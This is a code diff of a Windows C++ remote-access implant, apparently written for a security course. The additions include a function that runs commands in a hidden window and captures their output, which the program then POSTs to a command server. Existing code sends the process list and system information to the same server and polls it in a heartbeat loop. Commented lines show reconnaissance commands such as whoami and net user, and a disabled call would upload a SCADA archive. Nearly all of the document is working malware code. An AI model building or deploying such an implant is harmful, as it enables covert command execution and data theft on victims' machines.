@@ -1,12 +1,8 @@
-#include<cctype>
-#include<cmath>
-#include<cstring>
 #include<iostream>
 #include <iomanip>
 #include<Windows.h>
 #include<WinInet.h>
 #include <tchar.h>
-#include <versionhelpers.h>
 #include <iphlpapi.h>
 #include <tlhelp32.h>
 using namespace std;
@@ -18,8 +14,8 @@ using namespace std;
 #define FREE(x) HeapFree(GetProcessHeap(), 0, (x))
 
 //Uploads file to server
-//Params: handle for internet, path of file to upload 
-BOOL doFileUpload(HANDLE hInternet, char* filepath) {
+//Params: handle for internet, path of file to upload, server ip, port 
+BOOL doFileUpload(HANDLE hInternet, char* filepath, char* ip, int port) {
 	//https://stackoverflow.com/questions/6407755/how-to-send-a-zip-file-using-wininet-in-my-vc-application
 	char hdrs[] = "Content-Type: multipart/form-data; boundary=CSEC476";
 	char head[] = "--CSEC476\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n";
@@ -28,9 +24,11 @@ BOOL doFileUpload(HANDLE hInternet, char* filepath) {
 	DWORD bytesWritten = 0;
 	DWORD bytesRead = 0;
 	HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (!hFile)
+		return FALSE;
 	DWORD dataSize = GetFileSize(hFile, NULL);
 
-	HANDLE hConnect = InternetConnectA(hInternet, "127.0.0.1", 5000, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
+	HANDLE hConnect = InternetConnectA(hInternet, ip, port, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 	HttpAddRequestHeadersA(hRequest, hdrs, -1, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
 	
@@ -54,6 +52,77 @@ BOOL doFileUpload(HANDLE hInternet, char* filepath) {
 	HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
 	return TRUE;
 }
+
+
+//Executes commands and stores the output in string buffer. Timeout = MAX_TIMEOUT (prevents non-returning commands from breaking code)
+//Returns string buffer
+std::string execCmd(char* cmd, DWORD MAX_TIME)
+{
+	std::string output;
+	HANDLE hPipeRead;
+	HANDLE hPipeWrite;
+
+	SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES) };
+	saAttr.bInheritHandle = TRUE; 
+	saAttr.lpSecurityDescriptor = NULL;
+
+	if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))
+		return output;
+
+	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
+	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+	si.hStdOutput = hPipeWrite;
+	si.hStdError = hPipeWrite;
+	si.wShowWindow = SW_HIDE;
+	PROCESS_INFORMATION pi = { 0 };
+
+	BOOL fSuccess = CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+	if (!fSuccess)
+	{
+		CloseHandle(hPipeWrite);
+		CloseHandle(hPipeRead);
+		return output;
+	}
+
+	SYSTEMTIME startTime, currentTime;
+	FILETIME startFTime, currentFTime;
+	GetSystemTime(&startTime);
+	GetSystemTime(&currentTime);
+	SystemTimeToFileTime(&startTime, &startFTime);
+	SystemTimeToFileTime(&currentTime, &currentFTime);
+	
+
+	BOOL bProcessEnded = FALSE;
+	while (!bProcessEnded && currentFTime.dwLowDateTime < startFTime.dwLowDateTime + MAX_TIME){
+		GetSystemTime(&currentTime);
+		SystemTimeToFileTime(&currentTime, &currentFTime);
+		bProcessEnded = WaitForSingleObject(pi.hProcess, 250) == WAIT_OBJECT_0;
+
+		while(currentFTime.dwLowDateTime < startFTime.dwLowDateTime + MAX_TIME) {
+			GetSystemTime(&currentTime);
+			SystemTimeToFileTime(&currentTime, &currentFTime);
+			char buf[2048];
+			DWORD dwRead = 0;
+			DWORD dwAvail = 0;
+
+			if (!PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL))
+				break;
+			if (!dwAvail)
+				break;
+			if (!ReadFile(hPipeRead, buf, min(sizeof(buf) - 1, dwAvail), &dwRead, NULL) || !dwRead)
+				break;
+
+			buf[dwRead] = 0;
+			output += buf;
+		}
+	} 
+	CloseHandle(hPipeWrite);
+	CloseHandle(hPipeRead);
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+	return output;
+}
+
 
 
 // Takes in request handle, returns string based on response
@@ -237,8 +306,6 @@ std::string gatherInfo(HANDLE hInternet) {
 }
 
 
-
-//
 int main() {
 	const char* IP = "127.0.0.1";
 	const int PORT = 5000;
@@ -251,7 +318,30 @@ int main() {
 	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 
 	const char* pth = "C:\\Users\\shell\\Downloads\\scada_5.8.2_full_en.zip";
-	doFileUpload(hInternet, (char*)pth);
+	//const char* cmd = "cmd.exe /c dir C:\\";
+	const char* cmd = "cmd.exe /c ping google.com";
+
+	DWORD MAX_CMD_TIME = 5 * (10000000);
+	std::string cmdout = execCmd((char*)cmd, MAX_CMD_TIME);
+	//cout << execCmd((char*)cmd, MAX_CMD_TIME) << "\n";
+	//cout << execCmd((char*)"cmd.exe /c ping google.com", MAX_CMD_TIME) << "\n";
+	//cout << execCmd((char*)"cmd.exe /c whoami", MAX_CMD_TIME) << "\n";
+	//cout << execCmd((char*)"cmd.exe /c net user", MAX_CMD_TIME) << "\n";
+	//cout << execCmd((char*)"cmd.exe /c powershell.exe", MAX_CMD_TIME) << "\n";
+
+	//Sends cmd out to server
+	int cmdoutSize = cmdout.length();
+	char* cmdoutAscii = new char[cmdoutSize + 1];
+	strcpy_s(cmdoutAscii, cmdoutSize + 1, cmdout.c_str());
+	cout << cmdoutAscii << "\n";
+	HANDLE hConnectCMD = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
+	HANDLE hRequestCMD = HttpOpenRequestA(hConnectCMD, "POST", "/out", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	HttpSendRequestA(hRequestCMD, NULL, NULL, cmdoutAscii, cmdoutSize);
+
+
+
+	//doFileUpload(hInternet, (char*)pth, (char*)IP, PORT);
+
 
 
 	//Sends Process List to Server
@@ -261,7 +351,7 @@ int main() {
 	strcpy_s(procInfoAsciiBuf, procInfoSize + 1, procInfo.c_str());
 	cout << procInfoAsciiBuf << "\n";
 	HANDLE hConnectPS = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
-	HANDLE hRequestPS = HttpOpenRequestA(hConnect, "POST", "/ps", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	HANDLE hRequestPS = HttpOpenRequestA(hConnectPS, "POST", "/ps", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 	HttpSendRequestA(hRequestPS, NULL, NULL, procInfoAsciiBuf, procInfoSize);
 
 	//Sends all other info to server
@@ -270,7 +360,8 @@ int main() {
 	char* ai = new char[allInfo.length() + 1];
 	strcpy_s(ai, sze + 1, allInfo.c_str());
 	cout << ai << "\n";
-	HANDLE hRequest2 = HttpOpenRequestA(hConnect, "POST", "/info", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	HANDLE hConnect2 = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
+	HANDLE hRequest2 = HttpOpenRequestA(hConnect2, "POST", "/info", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 	BOOL reqSuccess2 = HttpSendRequestA(hRequest2, NULL, NULL, ai, sze);
 	if (reqSuccess2) {
 		cout << "success" << "\n";
@@ -279,6 +370,7 @@ int main() {
 		cout << GetLastError();
 	}
 
+	
 	while (true) {
 		HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 		cout << sendRequestGetResponse(hRequest) << "\n";
